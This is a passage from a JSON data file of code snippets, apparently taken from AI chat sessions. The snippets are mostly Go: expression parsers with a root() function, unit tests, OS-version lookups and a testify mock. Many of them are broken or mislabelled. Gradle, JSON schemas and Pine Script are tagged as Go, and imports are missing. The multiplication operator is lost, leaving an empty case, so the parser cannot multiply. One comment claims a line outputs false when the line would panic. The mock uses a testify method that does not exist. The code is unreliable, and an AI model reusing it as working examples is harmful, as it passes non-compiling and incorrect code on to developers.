buffer.Len() > 0 {\n\t\t\t\ttoken, err := createToken(buffer.String())\n\t\t\t\tif err != nil {\n\t\t\t\t\treturn\n\t\t\t\t}\n\t\t\t\tresult = append(result, token)\n\t\t\t\tbuffer.Reset()\n\t\t\t}\n\t\t\tresult = append(result, Token{Type: Operator, Value: string(ch)})\n\t\t} else {\n\t\t\tbuffer.WriteRune(ch)\n\t\t}\n\t}\n\n\tfor _, ch := range exp {\n\t\tlexer(ch)\n\t}\n\n\tif buffer.Len() > 0 {\n\t\ttoken, err := createToken(buffer.String())\n\t\tif err != nil {\n\t\t\treturn nil, err\n\t\t}\n\t\tresult = append(result, token)\n\t}\n\n\treturn\n}\n\n// createToken создат представление для значения токена.\nfunc createToken(value string) (Token, error) {\n\tif _, err := strconv.ParseFloat(value, 64); err == nil {\n\t\treturn Token{Type: Number, Value: value}, nil\n\t}\n\n\tif _, ok := variables[value]; ok {\n\t\treturn Token{Type: Variable, Value: value}, nil\n\t}\n\n\tif value == \"root\" {\n\t\treturn Token{Type: Function, Value: value}, nil\n\t}\n\n\treturn Token{}, fmt.Errorf(\"неизвестный токен: \\\"%s\\\"\", value)\n}\n\nvar variables = map[string]*big.Float{\n\t\"x\": big.NewFloat(5),\n}\n\nfunc compute(tokens Tokens) (stack []*big.Float, err error) {\n\tfor _, token := range tokens {\n\t\tif token.Type == Number {\n\t\t\tvalue, _, _ := big.ParseFloat(token.Value, 10, 200, 0)\n\t\t\tstack = append(stack, value)\n\t\t} else if token.Type == Variable {\n\t\t\tvalue := variables[token.Value]\n\t\t\tstack = append(stack, value)\n\t\t} else if token.Type == Operator {\n\t\t\tif len(stack) <= 1 {\n\t\t\t\treturn nil, fmt.Errorf(\"некорректное выражение, требуется два аргумента оператора %s\", token.Value)\n\t\t\t}\n\t\t\targ2 := stack[len(stack)-1]\n\t\t\targ1 := stack[len(stack)-2]\n\t\t\tstack = stack[:len(stack)-2]\n\n\t\t\tres := new(big.Float)\n\t\t\tswitch token.Value {\n\t\t\tcase \"+\":\n\t\t\t\tres.Add(arg1, arg2)\n\t\t\tcase \"-\":\n\t\t\t\tres.Sub(arg1, arg2)\n\t\t\tcase \"*\":\n\t\t\t\tres.Mul(arg1, arg2)\n\t\t\tcase \"/\":\n\t\t\t\tres.Quo(arg1, arg2)\n\t\t\tcase \"^\":\n\t\t\t\ttmp := arg2.Float64()\n\t\t\t\tbgf := bigfloat.Pow(arg1, tmp)\n\t\t\t\tres.Copy(bgf)\n\t\t\t}\n\t\t\tstack = append(stack, res)\n\t\t} else if token.Type == Function {\n\t\t\tif token.Value == \"root\" {\n\t\t\t\targ1 := stack[len(stack)-2]\n\t\t\t\targ2 := stack[len(stack)-1]\n\n\t\t\t\ttmp := new(big.Float)\n\t\t\t\ttmp.Quo(big.NewFloat(1), arg2)\n\n\t\t\t\tstack = stack[:len(stack)-2]\n\n\t\t\t\tres := bigfloat.Pow(arg1, tmp)\n\t\t\t\tstack = append(stack, res)\n\t\t\t}\n\t\t} else if token.Type == ArgumentSeparator {\n\t\t\tcontinue\n\t\t}\n\t}\n\n\tif len(stack) != 1 {\n\t\treturn stack, fmt.Errorf(\"некорректное выражение\")\n\t}\n\n\treturn stack, nil\n}\n\nfunc main() {\n\texpression := \"3^2 + root(27, 3) + x\"\n\n\ttokens, err := parseExpression(expression)\n\tif err != nil {\n\t\tfmt.Printf(\"Ошибка при парсинге выражения: %v\\n\", err)\n\t\treturn\n\t}\n\n\tstack, err := compute(tokens)\n\tif err != nil {\n\t\tfmt.Printf(\"Ошибка при вычислении выражения: %v\\n\", err)\n\t} else {\n\t\tfmt.Printf(\"Результат вычисления: %s\\n\", stack[0].Text('f', 10))\n\t}\n}",
    "filename": "3e8ce34cd65405824fd03fdf09013861_7.go"
  },
  {
    "conversation_hash": "6a108a8fff0f437ce4a7f2f5a9cde304",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "func compute(tokens []Token) (float64, []Token, error) {\n    if len(tokens) == 0 {\n        return 0, tokens, fmt.Errorf(\"ожидался токен\")\n    }\n\n    token := tokens[0]\n    tokens = tokens[1:]\n\n    switch token.Type {\n    // ...\n \n    case Operator:\n        if token.Value == \"(\" {\n            value, leftoverTokens, err := compute(tokens)\n            if err != nil {\n                return 0, tokens, err\n            }\n            if len(leftoverTokens) == 0 || leftoverTokens[0].Value != \")\" {\n                return 0, tokens, fmt.Errorf(\"ожидалась закрывающая скобка\")\n            }\n            tokens = leftoverTokens[1:]\n            return value, tokens, nil\n        }\n        // ...\n\n    case Function:\n        if token.Value == \"root\" {\n            if len(tokens) == 0 {\n                return 0, tokens, fmt.Errorf(\"ожидался аргумент функции\")\n            }\n\n            if tokens[0].Value != \"(\" {\n                return 0, tokens, fmt.Errorf(\"ожидалась открывающая скобка\")\n            }\n            tokens = tokens[1:]\n\n            base, leftoverTokens, err := compute(tokens)\n            if err != nil {\n                return 0, tokens, err\n            }\n            if len(leftoverTokens) == 0 || leftoverTokens[0].Type != ArgumentSeparator {\n                return 0, tokens, fmt.Errorf(\"ожидался разделитель аргументов ','\")\n            }\n\n            expTokens := leftoverTokens[1:]\n            exponent, leftoverTokens, err := compute(expTokens)\n            if err != nil {\n                return 0, tokens, err\n            }\n\n            if len(leftoverTokens) == 0 || leftoverTokens[0].Value != \")\" {\n                return 0, tokens, fmt.Errorf(\"ожидалась закрывающая скобка\")\n            }\n            tokens = leftoverTokens[1:]\n\n            return math.Pow(base, 1/exponent), tokens, nil\n        }\n\n    // ...\n    }\n // ...\n}",
    "filename": "6a108a8fff0f437ce4a7f2f5a9cde304_0.go"
  },
  {
    "conversation_hash": "aa3b6bb28393d1fea4cb6801d7ea46a3",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"math\"\n\t\"strings\"\n)\n\ntype TokenType int\n\nconst (\n\tNumber TokenType = iota\n\tOperator\n\tVariable\n\tFunction\n\tArgumentSeparator\n)\n\ntype Token struct {\n\tType  TokenType\n\tValue string\n}\n\nvar variables = make(map[string]float64)\n\nfunc parseExpression(expression string) ([]Token, error) {\n\ttokens := []Token{}\n\tvar buffer strings.Builder\n\n\tfor _, ch := range expression {\n\t\tif ch == ' ' {\n\t\t\tcontinue\n\t\t}\n\n\t\tif strings.ContainsRune(\"+-/^()!\", ch) {\n\t\t\tif buffer.Len() > 0 {\n\t\t\t\ttoken, err := createToken(buffer.String())\n\t\t\t\tif err != nil {\n\t\t\t\t\treturn nil, err\n\t\t\t\t}\n\t\t\t\ttokens = append(tokens, token)\n\t\t\t\tbuffer.Reset()\n\t\t\t}\n\t\t\ttokens = append(tokens, Token{Type: Operator, Value: string(ch)})\n\t\t} else if ch == ',' {\n\t\t\tif buffer.Len() > 0 {\n\t\t\t\ttoken, err := createToken(buffer.String())\n\t\t\t\tif err != nil {\n\t\t\t\t\treturn nil, err\n\t\t\t\t}\n\t\t\t\ttokens = append(tokens, token)\n\t\t\t\tbuffer.Reset()\n\t\t\t}\n\t\t\ttokens = append(tokens, Token{Type: ArgumentSeparator, Value: string(ch)})\n\t\t} else {\n\t\t\tbuffer.WriteRune(ch)\n\t\t}\n\t}\n\n\tif buffer.Len() > 0 {\n\t\ttoken, err := createToken(buffer.String())\n\t\tif err != nil {\n\t\t\treturn nil, err\n\t\t}\n\t\ttokens = append(tokens, token)\n\t}\n\n\treturn tokens, nil\n}\n\nfunc createToken(value string) (Token, error) {\n\tif _, err := strconv.ParseFloat(value, 64); err == nil {\n\t\treturn Token{Type: Number, Value: value}, nil\n\t}\n\n\tif _, ok := variables[value]; ok {\n\t\treturn Token{Type: Variable, Value: value}, nil\n\t}\n\n\tif value == \"root\" {\n\t\treturn Token{Type: Function, Value: value}, nil\n\t}\n\n\treturn Token{}, fmt.Errorf(\"неизвестный токен: %s\", value)\n}\n\ntype Parser struct {\n\ttokens       []Token\n\tcurrentToken int\n}\n\nfunc (p *Parser) Parse() (float64, error) {\n\tresult, err := p.parseExpression(0)\n\tif err != nil {\n\t\treturn 0, err\n\t}\n\treturn result, nil\n}\n\nfunc (p *Parser) parseExpression(precedence int) (float64, error) {\n\tleft, err := p.parsePrimary()\n\tif err != nil {\n\t\treturn 0, err\n\t}\n\n\tfor {\n\t\toperator := p.peekToken()\n\t\tif operator.Type != Operator || precedence >= getPrecedence(operator.Value) {\n\t\t\tbreak\n\t\t}\n\n\t\tp.nextToken()\n\n\t\tright, err := p.parseExpression(getPrecedence(operator.Value) + 1)\n\t\tif err != nil {\n\t\t\treturn 0, err\n\t\t}\n\n\t\tswitch operator.Value {\n\t\tcase \"+\":\n\t\t\tleft += right\n\t\tcase \"-\":\n\t\t\tleft -= right\n\t\tcase \"\":\n\t\t\tleft *= right\n\t\tcase \"/\":\n\t\t\tleft /= right\n\t\tcase \"^\":\n\t\t\tleft = math.Pow(left, right)\n\t\tdefault:\n\t\t\treturn 0, fmt.Errorf(\"unexpected operator: %s\", operator.Value)\n\t\t}\n\t}\n\n\treturn left, nil\n}\n\nfunc (p *Parser) parsePrimary() (float64, error) {\n\ttoken := p.peekToken()\n\n\tswitch token.Type {\n\tcase Number:\n\t\tp.nextToken()\n\t\tvalue, _ := strconv.ParseFloat(token.Value, 64)\n\t\treturn value, nil\n\tcase Variable:\n\t\tp.nextToken()\n\t\tvalue := variables[token.Value]\n\t\treturn value, nil\n\tcase Operator:\n\t\tif token.Value == \"(\" {\n\t\t\tp.nextToken()\n\t\t\tvalue, err := p.parseExpression(0)\n\t\t\tif err != nil {\n\t\t\t\treturn 0, err\n\t\t\t}\n\t\t\tif p.peekToken().Value != \")\" {\n\t\t\t\treturn 0, fmt.Errorf(\"ожидалась закрывающая скобка\")\n\t\t\t}\n\t\t\tp.nextToken()\n\t\t\treturn value, nil\n\t\t}\n\tcase Function:\n\t\tif token.Value == \"root\" {\n\t\t\tif p.peekToken(1).Value != \"(\" {\n\t\t\t\treturn 0, fmt.Errorf(\"ожидалась открывающая скобка\")\n\t\t\t}\n\t\t\tp.nextToken()\n\t\t\tp.nextToken()\n\n\t\t\tbase, err := p.parseExpression(0)\n\t\t\tif err != nil {\n\t\t\t\treturn 0, err\n\t\t\t}\n\t\t\tif p.peekToken().Type != ArgumentSeparator {\n\t\t\t\treturn 0, fmt.Errorf(\"ожидался разделитель аргументов ‘,’\")\n\t\t\t}\n\t\t\tp.nextToken()\n\n\t\t\texponent, err := p.parseExpression(0)\n\t\t\tif err != nil {\n\t\t\t\treturn 0, err\n\t\t\t}\n\n\t\t\tif p.peekToken().Value != \")\" {\n\t\t\t\treturn 0, fmt.Errorf(\"ожидалась закрывающая скобка\")\n\t\t\t}\n\t\t\tp.nextToken()\n\n\t\t\treturn math.Pow(base, 1/exponent), nil\n\t\t}\n\tdefault:\n\t\tbreak\n\t}\n\n\treturn 0, fmt.Errorf(\"необработанный токен: %v\", token)\n}\n\nfunc (p *Parser) peekToken(n ...int) Token {\n\tindex := p.currentToken\n\tif len(n) > 0 {\n\t\tindex += n[0]\n\t}\n\n\tif index < len(p.tokens) {\n\t\treturn p.tokens[index]\n\t}\n\treturn Token{}\n}\n\nfunc (p *Parser) nextToken() {\n\tp.currentToken++\n}\n\nfunc getPrecedence(operator string) int {\n\tswitch operator {\n\tcase \"+\", \"-\":\n\t\treturn 1\n\tcase \"\", \"/\":\n\t\treturn 2\n\tcase \"^\":\n\t\treturn 3\n\tdefault:\n\t\treturn 0\n\t}\n}\n\nfunc main() {\n\tvariables[\"x\"] = 5\n\n\texpression := \"3 ^ 2 + root(27, 3) + x\"\n\n\ttokens, err := parseExpression(expression)\n\tif err != nil {\n\t\tfmt.Printf(\"Ошибка при парсинге выражения: %v\\n\", err)\n\t\treturn\n\t}\n\n\tparser := Parser{tokens: tokens}\n\tresult, err := parser.Parse()\n\tif err != nil {\n\t\tfmt.Printf(\"Ошибка при вычислении выражения: %v\\n\", err)\n\t} else {\n\t\tfmt.Printf(\"Результат вычисления: %.4f\\n\", result)\n\t}\n}",
    "filename": "aa3b6bb28393d1fea4cb6801d7ea46a3_0.go"
  },
  {
    "conversation_hash": "5678148c5b7ee66c3dfb127f803fc83a",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/url\"\n)\n\nfunc main() {\n\tu, err := url.Parse(\"https://share.sandstalk.com:443/\")\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\tfmt.Println(u.Path) // 输出空字符串\n\tfmt.Println(u.Path == \"\") // 输出 true\n\tfmt.Println(u.Path[len(u.Path)-1] == '/') // 输出 false\n}",
    "filename": "5678148c5b7ee66c3dfb127f803fc83a_0.go"
  },
  {
    "conversation_hash": "ddfdeaea98390d12c06d1ad052ac9f98",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "android {\n       ...\n       buildFeatures {\n           compose true\n       }\n   }\n\n   dependencies {\n       ...\n       implementation 'androidx.compose.ui:ui:1.0.2'\n       implementation 'androidx.compose.material:material:1.0.2'\n       implementation 'androidx.compose.runtime:runtime-livedata:1.0.2'\n   }",
    "filename": "ddfdeaea98390d12c06d1ad052ac9f98_0.go"
  },
  {
    "conversation_hash": "750a8ab6e22cfb28bf1fa95214551776",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/base64\"\n\t\"testing\"\n)\n\nfunc TestBase64EncodeString(t *testing.T) {\n\tinput := \"Hello, World!\"\n\texpected := \"SGVsbG8sIFdvcmxkIQ==\"\n\n\toutput := Base64EncodeString(input)\n\tif output != expected {\n\t\tt.Errorf(\"Expected %s, but got %s\", expected, output)\n\t}\n}\n\nfunc TestBase64DecodeString(t *testing.T) {\n\tinput := \"SGVsbG8sIFdvcmxkIQ==\"\n\texpected := \"Hello, World!\"\n\n\toutput := Base64DecodeString(input)\n\tif output != expected {\n\t\tt.Errorf(\"Expected %s, but got %s\", expected, output)\n\t}\n}\n\nfunc main() {\n\t// 调用测试函数\n\tt := new(testing.T)\n\tTestBase64EncodeString(t)\n\tTestBase64DecodeString(t)\n}",
    "filename": "750a8ab6e22cfb28bf1fa95214551776_0.go"
  },
  {
    "conversation_hash": "750a8ab6e22cfb28bf1fa95214551776",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"testing\"\n\t\"time\"\n)\n\nfunc TestNowUnixMillisecond(t *testing.T) {\n\tcurrentTime := time.Now()\n\texpected := currentTime.UnixNano() / 1e6\n\n\toutput := NowUnixMillisecond()\n\tif output != expected {\n\t\tt.Errorf(\"Expected %d, but got %d\", expected, output)\n\t}\n}\n\nfunc main() {\n\t// 调用测试函数\n\tt := new(testing.T)\n\tTestNowUnixMillisecond(t)\n}",
    "filename": "750a8ab6e22cfb28bf1fa95214551776_1.go"
  },
  {
    "conversation_hash": "750a8ab6e22cfb28bf1fa95214551776",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"testing\"\n\t\"time\"\n)\n\nfunc TestNowUnixMillisecond(t *testing.T) {\n\tcurrentTime := time.Now()\n\texpected := currentTime.UnixMilli()\n\n\toutput := NowUnixMillisecond()\n\tif output != expected {\n\t\tt.Errorf(\"Expected %d, but got %d\", expected, output)\n\t}\n}\n\nfunc main() {\n\t// 调用测试函数\n\tt := new(testing.T)\n\tTestNowUnixMillisecond(t)\n}",
    "filename": "750a8ab6e22cfb28bf1fa95214551776_2.go"
  },
  {
    "conversation_hash": "750a8ab6e22cfb28bf1fa95214551776",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"regexp\"\n\t\"testing\"\n)\n\nfunc TestIsValidInstanceId(t *testing.T) {\n\tvalidInstanceId := \"i-AbCdEfG1234567890\"\n\tinvalidInstanceId := \"i-InvalidInstanceId\"\n\n\tvalidOutput := isValidInstanceId(validInstanceId)\n\tinvalidOutput := isValidInstanceId(invalidInstanceId)\n\n\tif !validOutput {\n\t\tt.Errorf(\"Expected valid instance ID, but got invalid\")\n\t}\n\tif invalidOutput {\n\t\tt.Errorf(\"Expected invalid instance ID, but got valid\")\n\t}\n}\n\nfunc main() {\n\t// 调用测试函数\n\tt := new(testing.T)\n\tTestIsValidInstanceId(t)\n}",
    "filename": "750a8ab6e22cfb28bf1fa95214551776_3.go"
  },
  {
    "conversation_hash": "750a8ab6e22cfb28bf1fa95214551776",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"regexp\"\n\t\"testing\"\n)\n\nfunc TestIsValidInstanceId(t *testing.T) {\n\tvalidInstanceId := \"i-AbCdEfG1234567890\"\n\tinvalidInstanceId := \"i-InvalidInstanceId\"\n\n\t// 测试长度不匹配的情况\n\tinvalidLengthInstance := \"i-InvalidLength\"\n\tinvalidLengthOutput := isValidInstanceId(invalidLengthInstance)\n\n\tif invalidLengthOutput {\n\t\tt.Errorf(\"Expected invalid length instance ID, but got valid\")\n\t}\n\n\t// 测试格式不匹配的情况\n\tinvalidFormatInstance := \"InvalidFormat\"\n\tinvalidFormatOutput := isValidInstanceId(invalidFormatInstance)\n\n\tif invalidFormatOutput {\n\t\tt.Errorf(\"Expected invalid format instance ID, but got valid\")\n\t}\n\n\t// 使用正则表达式进行匹配\n\tvalidRegex := regexp.MustCompile(`^i-[0-9a-zA-Z]{20}$`)\n\tinvalidRegex := regexp.MustCompile(`^i-[0-9a-zA-Z]{19}$`)\n\n\t// 测试有效实例ID\n\tvalidOutput := isValidInstanceId(validInstanceId)\n\tif !validOutput {\n\t\tt.Errorf(\"Expected valid instance ID, but got invalid\")\n\t}\n\n\t// 测试无效实例ID\n\tinvalidOutput := isValidInstanceId(invalidInstanceId)\n\tif invalidOutput {\n\t\tt.Errorf(\"Expected invalid instance ID, but got valid\")\n\t}\n\n\t// 基于正则表达式再次验证实例ID\n\tif !validRegex.MatchString(validInstanceId) {\n\t\tt.Errorf(\"Expected valid instance ID, but regex validation failed\")\n\t}\n\n\tif invalidRegex.MatchString(invalidInstanceId) {\n\t\tt.Errorf(\"Expected invalid instance ID, but regex validation passed\")\n\t}\n}\n\nfunc main() {\n\t// 调用测试函数\n\tt := new(testing.T)\n\tTestIsValidInstanceId(t)\n}",
    "filename": "750a8ab6e22cfb28bf1fa95214551776_4.go"
  },
  {
    "conversation_hash": "750a8ab6e22cfb28bf1fa95214551776",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"runtime\"\n)\n\nfunc main() {\n\tosVersion := runtime.GOOS\n\tfmt.Println(\"Operating System:\", osVersion)\n}",
    "filename": "750a8ab6e22cfb28bf1fa95214551776_5.go"
  },
  {
    "conversation_hash": "750a8ab6e22cfb28bf1fa95214551776",
    "code_index": 7,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"os\"\n\t\"os/exec\"\n\t\"strings\"\n)\n\nfunc main() {\n\tcmd := exec.Command(\"lsb_release\", \"-r\")\n\toutput, err := cmd.Output()\n\tif err != nil {\n\t\tfmt.Println(\"Error:\", err)\n\t\tos.Exit(1)\n\t}\n\n\tversion := strings.Split(string(output), \"\\t\")[1]\n\tfmt.Println(\"OS Version:\", strings.TrimSpace(version))\n}",
    "filename": "750a8ab6e22cfb28bf1fa95214551776_7.go"
  },
  {
    "conversation_hash": "750a8ab6e22cfb28bf1fa95214551776",
    "code_index": 8,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"os\"\n\t\"os/exec\"\n\t\"strings\"\n)\n\nfunc main() {\n\tcmd := exec.Command(\"sw_vers\", \"-productVersion\")\n\toutput, err := cmd.Output()\n\tif err != nil {\n\t\tfmt.Println(\"Error:\", err)\n\t\tos.Exit(1)\n\t}\n\n\tversion := strings.TrimSpace(string(output))\n\tfmt.Println(\"OS Version:\", version)\n}",
    "filename": "750a8ab6e22cfb28bf1fa95214551776_8.go"
  },
  {
    "conversation_hash": "750a8ab6e22cfb28bf1fa95214551776",
    "code_index": 9,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"os\"\n\t\"syscall\"\n\t\"unsafe\"\n)\n\nfunc main() {\n\tversion, err := getWindowsVersion()\n\tif err != nil {\n\t\tfmt.Println(\"Error:\", err)\n\t\tos.Exit(1)\n\t}\n\n\tfmt.Println(\"OS Version:\", version)\n}\n\nfunc getWindowsVersion() (string, error) {\n\tkernel32, err := syscall.LoadLibrary(\"kernel32.dll\")\n\tif err != nil {\n\t\treturn \"\", err\n\t}\n\tdefer syscall.FreeLibrary(kernel32)\n\n\tgetVersion, err := syscall.GetProcAddress(kernel32, \"GetVersion\")\n\tif err != nil {\n\t\treturn \"\", err\n\t}\n\n\tversion, _, _ := syscall.Syscall(uintptr(getVersion), 0, 0, 0, 0)\n\tmajor := uint8(version)\n\tminor := uint8(version >> 8)\n\tbuild := uint16(version >> 16)\n\treturn fmt.Sprintf(\"%d.%d.%d\", major, minor, build), nil\n}",
    "filename": "750a8ab6e22cfb28bf1fa95214551776_9.go"
  },
  {
    "conversation_hash": "750a8ab6e22cfb28bf1fa95214551776",
    "code_index": 10,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"os/exec\"\n\t\"testing\"\n)\n\nfunc TestGetOsVersion(t *testing.T) {\n\t// 测试 Linux 系统的情况\n\tcmd := exec.Command(\"uname\", \"-r\")\n\texpected, _ := cmd.Output()\n\n\toutput := GetOsVersion()\n\tif output != string(expected) {\n\t\tt.Errorf(\"Expected %s, but got %s\", expected, output)\n\t}\n\n\t// 测试 Darwin（macOS）系统的情况\n\t// 这里假设 uname -r 命令输出为 \"20.6.0\"\n\tmockCmdOutput := \"20.6.0\"\n\tmockUnameCommand = func(name string, args ...string) *exec.Cmd {\n\t\tcs := []string{\"-test.run=TestMockUname\", \"--\"}\n\t\tcs = append(cs, args...)\n\t\tcmd := exec.Command(os.Args[0], cs...)\n\t\tcmd.Env = []string{\"GO_WANT_MOCK_UNAME=1\", \"MOCK_UNAME_OUTPUT=\" + mockCmdOutput}\n\t\treturn cmd\n\t}\n\n\texpected = []byte(mockCmdOutput)\n\toutput = GetOsVersion()\n\tif output != string(expected) {\n\t\tt.Errorf(\"Expected %s, but got %s\", expected, output)\n\t}\n}\n\nfunc TestMockUname(t *testing.T) {\n\tif os.Getenv(\"GO_WANT_MOCK_UNAME\") != \"1\" {\n\t\treturn\n\t}\n\toutput := []byte(os.Getenv(\"MOCK_UNAME_OUTPUT\"))\n\tos.Stdout.Write(output)\n\tos.Exit(0)\n}\n\nfunc main() {\n\t// 调用测试函数\n\tt := new(testing.T)\n\tTestGetOsVersion(t)\n}",
    "filename": "750a8ab6e22cfb28bf1fa95214551776_10.go"
  },
  {
    "conversation_hash": "cc3fba9aaf24eae48700796505f1039c",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "import (\n\t\"os\"\n\t\"path/filepath\"\n\t\"testing\"\n)\n\nfunc TestGetWorkingPath(t *testing.T) {\n\t// 构造一个测试用的临时目录\n\ttempDir := filepath.Join(os.TempDir(), \"testDir\")\n\terr := os.Mkdir(tempDir, 0700)\n\tif err != nil {\n\t\tt.Errorf(\"Failed to create test directory: %v\", err)\n\t\treturn\n\t}\n\tdefer os.RemoveAll(tempDir)\n\n\t// 将临时目录设置为当前目录\n\terr = os.Chdir(tempDir)\n\tif err != nil {\n\t\tt.Errorf(\"Failed to change directory: %v\", err)\n\t\treturn\n\t}\n\n\t// 调用被测试函数\n\tworkingPath := GetWorkingPath()\n\n\t// 验证返回值是否与期望的一致\n\texpectedPath, err := filepath.Abs(tempDir)\n\tif err != nil {\n\t\tt.Errorf(\"Failed to get absolute path: %v\", err)\n\t\treturn\n\t}\n\tif workingPath != expectedPath {\n\t\tt.Errorf(\"GetWorkingPath() returned incorrect path, expected '%s', got '%s'\", expectedPath, workingPath)\n\t}\n}",
    "filename": "cc3fba9aaf24eae48700796505f1039c_0.go"
  },
  {
    "conversation_hash": "cc3fba9aaf24eae48700796505f1039c",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"os\"\n\t\"path/filepath\"\n)\n\nfunc main() {\n\texecutablePath, err := os.Executable()\n\tif err != nil {\n\t\tfmt.Println(\"Failed to get executable path:\", err)\n\t\treturn\n\t}\n\n\texecutableDir := filepath.Dir(executablePath)\n\tfmt.Println(\"Executable Directory:\", executableDir)\n}",
    "filename": "cc3fba9aaf24eae48700796505f1039c_1.go"
  },
  {
    "conversation_hash": "cc3fba9aaf24eae48700796505f1039c",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"testing\"\n)\n\nfunc IncrementCounter() int {\n\tcounter := 0\n\tcounter++\n\treturn counter\n}\n\nfunc TestIncrementCounter(t *testing.T) {\n\texpected := 1\n\tresult := IncrementCounter()\n\tif result != expected {\n\t\tt.Errorf(\"Expected %d, got %d\", expected, result)\n\t}\n}",
    "filename": "cc3fba9aaf24eae48700796505f1039c_2.go"
  },
  {
    "conversation_hash": "cc3fba9aaf24eae48700796505f1039c",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "// 定义一个接口\ntype Calculator interface {\n\tAdd(a, b int) int\n}\n\n// 手动生成 Mock 对象及其方法\ntype MockCalculator struct {\n\tmock.Mock\n}\n\nfunc (m *MockCalculator) Add(a, b int) int {\n\targs := m.Called(a, b)\n\treturn args.Int(0)\n}\n\n// 测试用例\nfunc TestCalculator_Add(t *testing.T) {\n\t// 创建 Mock 对象\n\tmockCalc := new(MockCalculator)\n\n\t// 设置 Mock 对象的行为\n\tmockCalc.When().Add(2, 3).Return(5)\n\n\t// 调用接口方法\n\tresult := mockCalc.Add(2, 3)\n\n\t// 验证返回值是否符合预期\n\tif result != 5 {\n\t\tt.Errorf(\"Expected 5, got %d\", result)\n\t}\n}",
    "filename": "cc3fba9aaf24eae48700796505f1039c_3.go"
  },
  {
    "conversation_hash": "fca9a0cab343cdeb1520d408aa696605",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "{\n  \"type\": \"record\",\n  \"name\": \"User\",\n  \"fields\": [\n    {\"name\": \"id\", \"type\": \"int\"},\n    {\"name\": \"name\", \"type\": \"string\"}\n  ]\n}\n\n{\n  \"type\": \"record\",\n  \"name\": \"Emoji\",\n  \"fields\": [\n    {\"name\": \"id\", \"type\": \"int\"},\n    {\"name\": \"name\", \"type\": \"string\"},\n    {\"name\": \"userId\", \"type\": \"int\"}\n  ]\n}\n\n{\n  \"type\": \"record\",\n  \"name\": \"Article\",\n  \"fields\": [\n    {\"name\": \"id\", \"type\": \"int\"},\n    {\"name\": \"title\", \"type\": \"string\"},\n    {\"name\": \"emojiId\", \"type\": \"int\"}\n  ]\n}\n\n{\n  \"type\": \"record\",\n  \"name\": \"Advice\",\n  \"fields\": [\n    {\"name\": \"id\", \"type\": \"int\"},\n    {\"name\": \"content\", \"type\": \"string\"},\n    {\"name\": \"emojiId\", \"type\": \"int\"}\n  ]\n}",
    "filename": "fca9a0cab343cdeb1520d408aa696605_2.go"
  },
  {
    "conversation_hash": "366b488226ab0a0ebf5dc895334600a9",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "//@version=4\nstrategy(\"VWAP Strategy\", overlay=true)\n\n// Calculate VWAP\ncumulativePeriod = input(14, \"Period\")\ntypicalPrice = (high + low + close) / 3\ntypicalPriceVolume = typicalPrice * volume\ncumulativeTypicalPriceVolume = sum(typicalPriceVolume, cumulativePeriod)\ncumulativeVolume = sum(volume, cumulativePeriod)\nvwapValue = cumulativeTypicalPriceVolume / cumulativeVolume\n\n// Define entry and exit conditions\npriceCrossAboveVWAP = crossover(close, vwapValue)\npriceCrossBelowVWAP = crossunder(close, vwapValue)\n\n// Enter long position when price crosses above VWAP\nif priceCrossAboveVWAP\n    strategy.entry(\"Buy\", strategy.long)\n\n// Enter short position when price crosses below VWAP\nif priceCrossBelowVWAP\n    strategy.entry(\"Sell\", strategy.short)\n\n// Exit all positions when opposite crossover occurs\nif priceCrossAboveVWAP and strategy.position_size < 0\n    strategy.close(\"Sell\")\nif priceCrossBelowVWAP and strategy.position_size > 0\n    strategy.close(\"Buy\")\n\n// Plot VWAP\nplot(vwapValue, color=color.blue, title=\"VWAP\")",
    "filename": "366b488226ab0a0ebf5dc895334600a9_0.go"
  },
  {
    "conversation_hash": "4494d4198e4ed0aaa6d758ec58dc6bb9",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "[\n    {\n        \"name\": \"User\",\n        \"type\": \"record\",\n        \"logicalType\": \"Entity\",\n        \"fields\": [\n            {\"name\": \"id\", \"type\": \"long\"},\n            {\"name\": \"username\", \"type\": \"string\"},\n            {\"name\": \"first_name\", \"type\": \"string\"},\n            {\"name\": \"last_name\", \"type\": \"string\"}\n        ]\n    },\n    {\n        \"name\": \"Emoji\",\n        \"type\": \"record\",\n        \"logicalType\": \"Aggregate\",\n        \"fields\": [\n            {\"name\": \"id\", \"type\": \"long\"},\n            {\"name\": \"user_id\", \"type\": \"long\"}\n        ]\n    },\n    {\n        \"name\": \"Article\",\n        \"type\": \"record\",\n        \"logicalType\": \"Aggregate\",\n        \"fields\": [\n            {\"name\": \"id\", \"type\": \"long\"},\n            {\"name\": \"title\", \"type\": \"string\"},\n            {\"name\": \"author\", \"type\": \"string\"},\n            {\"name\": \"date_published\", \"type\": \"string\"},\n            {\"name\": \"content\", \"type\": \"string\"},\n            {\"name\": \"tags\", \"type\": {\"type\": \"array\", \"items\" : \"string\"}},\n            {\"name\": 